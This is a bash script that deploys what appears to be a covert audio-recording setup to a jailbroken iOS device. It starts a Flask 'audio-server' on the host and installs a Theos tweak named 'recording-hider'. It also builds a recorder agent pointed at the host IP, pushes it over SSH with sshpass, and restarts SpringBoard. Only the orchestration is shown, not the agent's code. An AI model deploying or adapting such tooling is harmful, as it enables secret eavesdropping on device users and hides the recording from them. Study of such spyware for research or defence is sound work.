#!/bin/bash

USERNAME=$1
PASSWORD=$2
DEVICE_IP=$3
HOST_IP=$4
JB_DIR=$5

# Kill current server process
kill -9 $(lsof -t -i:5000)

echo "Deploy audo-server"
cd audio-server
pip3 install --break-system-packages flask werkzeug
python3 app.py &>/dev/null &
cd ..

echo "Deploy hooker"
cd recorder-agent-hooker/recording-hider-theos
./deploy.sh $PASSWORD
cd ../..

echo "Deploy recorder-agent"
cd recorder-agent
./build.sh $HOST_IP $JB_DIR
./deploy.sh $USERNAME $PASSWORD $DEVICE_IP $JB_DIR

sshpass -p "$PASSWORD" ssh "$USERNAME"@"$DEVICE_IP" "killall -9 SpringBoard"